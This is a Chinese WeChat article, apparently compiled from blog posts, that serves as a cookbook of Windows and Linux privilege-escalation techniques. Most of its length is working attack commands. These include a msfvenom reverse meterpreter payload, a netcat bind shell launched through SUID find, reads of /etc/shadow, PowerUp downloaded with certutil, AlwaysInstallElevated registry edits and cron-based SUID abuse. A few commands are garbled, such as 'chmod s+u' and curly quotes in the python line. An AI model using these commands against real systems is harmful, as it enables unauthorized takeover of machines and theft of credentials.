> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/laDMI2wuS5C_TqAcLqZtZQ)

**前言**  

文章搜集于网络，非本人原创。点击参考链接可查看详细内容。

**正文**

**Windows**

一、溢出漏洞提权

参考链接：

https://blog.csdn.net/qq_36119192/article/details/104280692

①原理分析

本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出 Administrator 权限。

github 上 windows 系统溢出漏洞提权的汇总：

https://github.com/SecWiki/windows-kernel-exploits

实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。在 MSF 中，最常用的提权模块是 CVE-2018-8120；在 CobaltStrike 中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的 exe 程序。exe 程序均支持 32 和 64 位的机器。

②方法步骤

1.systeminfo 收集补丁信息

执行命令:systeminfo   查看系统信息 (包含补丁信息)

2. 对比补丁编号，寻找可用 exp(Exploit，漏洞攻击脚本)

寻找此版本存在的所有漏洞，对比此服务器有哪些没有打过补丁，利用没打补丁的漏洞 exp 攻击

3. 将合适的 exp 上传到服务器【可利用 dama(密码 xiaowang520)、菜刀上传】

exp 上传位置 1. 网站的 upload(网站默认上传文件)2. 网站中存在任意用户可读可写可执行的目录（Windows2003：RECYCLER 回收站，windows2008：C:\Windows\Temp\）

4. 使用 exp 进行提权，执行系统命令 (使用方法看具体的 exp 说明)

二、令牌窃取

参考链接：

https://blog.csdn.net/zzlx123/article/details/104789819

①原理分析

令牌 (token) 是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。

假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。

②方法步骤

1. 进入 incognito 模块

```
use incognito

```

2. 列出令牌

```
list_tokens -u

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8daggy97ics1QY55u3jBVDDMREwoZPXNNTspQN1EwibvHuqMGwqaTPXRyHbg/640?wx_fmt=png)

3. 窃取

```
impersonate_token "NT AUTHORITY\\SYSTEM"

```

三、AT/SC/PS 提权

参考链接：

https://blog.csdn.net/weixin_44032232/article/details/114168765

①at 命令提权

原理：at 命令提权的原理：at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用的是 system 权限。

适用版本：Win2000 & Win2003 & XP 中还是存在的，在 Win7 以后被剔除

使用方法：当我们拿到一个低权限的用户，通过 3389 端口远程连接上后，可以通过 at 命令来进行本地提权。

```
at 12:31 /interactive cmd

```

 #在 19：39 分生成一个交互式的 System 权限的 cmd  

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagFJW1fVapBUFuErq8WK2avImrlaEo27VuRlahwt6E8Srv0tmjvciabwQ/640?wx_fmt=png)

②sc 命令提权

原理：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于 “控制面板” 中“管理工具”项中的“服务”。

适用版本：windows 7、8、03、08、12、16

使用方法：

# 这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务

```
sc Create syscmd binPath= "cmd /K start" type= own type= interact

```

# 然后执行

sc start syscmd  # 就得到了一个 system 权限的 cmd 环境

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dag0f0LqeZaHwdlNcoZqOlgJciau3dAzib7Gue278ibwplSQpaVhulUutp9A/640?wx_fmt=png)

③PS 命令提权  

原理：官方工具

适用版本：Win2003 & Win2008

使用方法：

```
psexec.exe -accepteula -s -i -d cmd.exe

```

四、不带引号的服务路径提权

参考链接：

https://www.freesion.com/article/68201384168/

①原理分析

当系统管理员配置 Windows 服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。

当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。

漏洞服务下载地址：

https://www.exploit-db.com/exploits/40428

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagwepl0DnpZCr5ric9vYHbMkzj1kibKjXlA6EkMFp6AKQJPJyLhkvWFf1w/640?wx_fmt=png)

路径没有包含在引号中，服务会按照以下顺序依次执行  

c:\program.exe

c:\program files.exe

c:\program files (x86)\grasssoft\macro.exe

c:\program files (x86)\grasssoft\macro expert\MacroService.exe

假如存在漏洞路径，我们可以将 msf 木马放到上面的路径下，然后重启机器，此时，反弹回来的 shell，则是一个 system 的 shell。

使用以下命令查看系统中错误配置的路径：

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

```

②方法步骤

1. 用 MSF 生成一个反弹 shell 的 exe

2. 将 exe 命名为 program.exe 上传至 C 盘目录下，或者命名为 program files.exe 上传至 C:\program files(x86) 目录下，相同的以此类推

3. 等待目标执行后 MSF 上线

五、进程注入提权

参考链接：

https://blog.csdn.net/negnegil/article/details/120253733

①原理分析

使用 pinjector.exe 注入到 system 用户的进程中，使该进程绑定在 0.0.0.0:port ，并建立监听端口，攻击者从攻击机上主动连接该地址，获取到系统的 system 权限，注入进程提权相当于开启了一个后门， 隐蔽性极高，不会创建新的进程，很难发现

②使用步骤

1. 下载 pinjector.exe

https://www.tarasco.org/security/Process_Injector/index.html

2. 上传 pinjector.exe 到靶机可执行目录，列出所有进程

```
pinjector.exe -l

```

3. 选择一个 system 权限运行的进程，对此 pid 进程执行注入，并建立侦听端口

```
pinjector.exe -p <pid> cmd <port>

```

4. 使用 nc 连接目标服务器端口

```
nc -nv 192.168.0.117 5555

```

六、Unattended Installs 提权

参考链接：

https://blog.csdn.net/negnegil/article/details/120253733

①原理分析

通常大型组织在部署某些员工较多或时间紧缺的程序时，会使用 Unattended Installs 自动安装，这种方式允许程序在不需要管理员的操作下进行自动安装，这种方式在部署程序前期较有用，但它也会在系统中残留一个名为 Unattend 的 XML 文件，这个 XML 件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户等。

②使用步骤

1.1 查找 Unattend 的 XML 文件，通常在以下文件夹中

C:\sysprep.inf

C:\syspreg\sysprep.xml

C:\Windows\system32\sysprep.inf

C:\windows\system32\sysprep\sysprep.xml

C:\unattend.xml

C:\Windows\Panther\Unattend.xml

C:\Windows\Panther\Unattended.xml

C:\Windows\Panther\Unattend\Unattended.xml

C:\Windows\Panther\Unattend\Unattend.xml

C:\Windows\System32\Sysprep\Unattend.xml

C:\Windows\System32\Sysprep\Panther\Unattend.xml

可以使用命令全局搜索

```
dir /b /s c:\unattend.xml

```

除此之外，系统中遗留的 sysprep.xml 和 sysprep.inf 文件中也可能包含部署系统时使用的凭证信息，可以通过利用这些信息进行提权。

通过搜索 UserAccounts 、Administrators、password 等对凭证进行定位

部分文件内容如下：

<UserAccounts>

    <LocalAccounts>

        <LocalAccount>

            <Password>

                <Value>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=</Value>                         <PlainText>false</PlainText>

            </Password>

            <Description>Local Administrator</Description>                        <DisplayName>Administrator</DisplayName>                             <Group>Administrators</Group>

            <Name>Administrator</Name>

        </LocalAccount>

    </LocalAccounts>

</UserAccounts>

在以上文件中，可以看到 一个本地账户被创建并加入到了管理员组中。

可以猜测密码的值应该是以 Base64 进行编码的

对密码值进行 Base64 解码

UEBzc3dvcmQxMjMhUGFzc3dvcmQ=

##解码得到

P@ssword123!Password

通常微软会在编码前的密码后加上 password，

所以这里本地管理员的密码实际上是：P@ssword123!

1.2MSF 中的利用模块

使用 post/windows/gather/enum_unattend 模块枚举连接的 session 中的 Unattend

```
msf6 > use post/windows/gather/enum_unattend
msf6 > set session 1
msf6 >exploit

```

七、AlwaysInstallElevated 提权

参考链接：

https://blog.csdn.net/qq_41874930/article/details/109624274

①原理分析

AlwaysInstallElevated 是注册表的一个键值，当其值为 1 的时候，普通用户即可以 system 权限安装 msi 程序。

②方法步骤

1. 判断是否激活 alwaysinstallelevated

1.1 通过 powerup 判断

下载 powerup

```
certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

```

打开 powershell，绕过执行策略并添加倒入 powerup 模块

```
Set-ExecutionPolicy Bypass -Scope Process
. .\PowerUp.ps1

```

使用 Get-RegistryAlwaysInstallElevated 命令，返回 true 代表开启，false 代表关闭

```
Get-RegistryAlwaysInstallElevated

```

1.2 通过注册表的键值判断

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

2. 激活 AlwaysInstallElevated

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1

```

修改注册表的这两项需要有下面两权限：

SeRestorePrivilege

SeTakeOwnershipPrivilege

使用 whoami /priv 可以查看权限。

3. 提权

3.1 下载 exemsi

https://www.exemsi.com/download/

3.2 用 msf 生成 exe

```
msfvenom -p windows/x64/meterpreter/reverse_http LPORT=9090 LHOST=172.16.250.1 -f exe >1.exe

```

3.3 使用 exemsi 将 exe 封装成 msi

3.4 将 msi 上传至目标机器并运行，记得在 MSF 设置好监听器

```
msiexec /q /i 1.msi

```

**Linux**

一、SUID 提权

参考链接：

https://blog.csdn.net/shuteer_xu/article/details/104912790

①原理分析

SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序 / 文件）所有者的权限来运行一个程序 / 文件。用户在执行程序 / 文件 / 命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID。

②方法步骤

已知的可用来提权的 linux 可行性的文件列表如下：

Nmap、Vim、find、Bash、More、Less、Nano、cp

以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

```

1.NMAP

较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。

交互模式可以通过执行 Nmap 参数 "interactive"

```
nmap --interactive

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagXBheIpIPicCUlqv7XNicT936WWoiae6OgfYa89YcjnXntNnnWoHIibKyjw/640?wx_fmt=png)

以下命令将提供一个提升的 shell：

```
nmap> !sh

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagZHTjJoxZAgeb3xUUEY2HKLMb59pnHDxcYSHj3eMN45XS4SLTj6DauA/640?wx_fmt=png)

2.find

如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。

```
touch pentestlab
find pentestlab -exec whoami \;

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagDjnYbpkuDTVtdBLTuiaKUskU1IZicrvddGDBbYClicTKQnVZNiasJl8XLw/640?wx_fmt=png)

大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root：

```
find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagsfX0WUD5xGrYiaYf6AsPGLpZbLcjT04KgMqhicdnEjia8fG1xAAtnWdqg/640?wx_fmt=png)

连接上去就会直接获取到一个 Root 权限的 shell：  

```
netcat 192.168.1.189 5555

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagDDMLqHpfLIVRjScTia3ibe6koO7KbW3oGqJFGJHjETgO2S62MKEq4icCA/640?wx_fmt=png)

3.vim

Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。

```
vim.tiny /etc/shadow

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dag6BCBEopj7bPKkG2wH6xgneeZ7lckzw0FA1ERK9zD9DDhoa1wSibt6HA/640?wx_fmt=png)

```
vim.tiny# Press ESC key
:set shell=/bin/sh
:shell

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjZ5lwqkWGbnRiaia9HVl8dagErAxuvp3o0blsjTq6FiavISwgT6sIeicFGu4eFGgzIK1ovCJ9yZIgnsw/640?wx_fmt=png)

4.bash  

以下命令将以 root 权限打开一个 bash shell:

```
bash -p

```

5.Less/more

```
less /etc/passwd
!/bin/sh

```

```
more /home/pelle/myfile
!/bin/bash

```

6.cp

使用 cp 覆盖 /etc/shadow

7.mv

使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers

8.awk

```
awk 'BEGIN {system("/bin/bash")}'

```

9.man

```
man passwd
!/bin/bash

```

10.python/perl/ruby/lua/etc

perl

```
exec "/bin/bash";

```

python

```
import os
os.system("/bin/bash")

```

11.tcpdump

```
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

```

二、内核漏洞提权

参考链接：

https://zhuanlan.zhihu.com/p/78943079

①原理分析

跟 Windows 中的 System 用户一样，root 用户拥有对操作系统的所有管理权限。在渗透中，有时候成功利用某些漏洞只会获取一个低权限用户，所以需要使用提权技巧，提升到权限更高的 root 用户，完全控制整个系统。

②方法步骤

1. 信息收集，执行 uname –a 命令来查看内核版本，也可以使用 lsb_release –a 命令来查看当前系统发行版的具体版本号。

2. 从以下网址查找可用的 exp

https://www.exploit-db.com/

3. 将下载的 exp 上传至目标，编译并赋予可执行权限

```
gcc exp.c  -o exp
chmod +x exp

```

4. 执行编译好的 exp

```
./exp

```

5. 使用 python 生成交互式 shell

```
python -c ‘import pty; pty.spawn(“/bin/bash”)’

```

三、环境变量提权

参考链接：

https://www.freebuf.com/articles/system/173903.html

①原理分析

PATH 是 Linux 和类 Unix 操作系统中的环境变量，它指定存储可执行程序的所有 bin 和 sbin 目录。当用户在终端上执行任何命令时，它会通过 PATH 变量来响应用户执行的命令，并向 shell 发送请求以搜索可执行文件。超级用户通常还具有 /sbin 和 /usr/sbin 条目，以便于系统管理命令的执行。

②方法步骤

详细见参考链接

四、计划任务

参考链接：

https://tsov.net/uupee/25190/

①原理分析

定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。

②方法步骤

1. 创建计划任务

```
cat /etc/crontab ls -al /tmp/cleanup.py cat /tmp/cleanup.py

```

其实有许多方法可以获取 root 权限，我们采用开启 /bin/dash SUID 位的方法,cleanup.py 里面的内容：

import os

import sys

try:

os.system(‘chmod s+u /bin/dash’)

except:

sys.exit()

2. 两分钟后，就设置了 /bin/dash 的 SUID 权限，运行完成后就获取了 root 权限。

```
/bin/dash

```

关于计划任务提权，还有很多姿势，详细请见参考链接。

公众号已经将已发布资料和工具打包好了，**关注公众号点击 “资料领取”**，就可以获取了，后续会更新更多资源，谢谢各位客官支持。

更多文章请关注公众号：星河疯客 admin

![](https://mmbiz.qpic.cn/mmbiz_jpg/DT3jlATYvfhSChiaosv15ZpIib4CEExVwTZfiar4OKLeiaX0HLvIBCtHpibgzRQK8pkN2aOTlJ3FDEEXGgrOtApfJGw/640?wx_fmt=jpeg)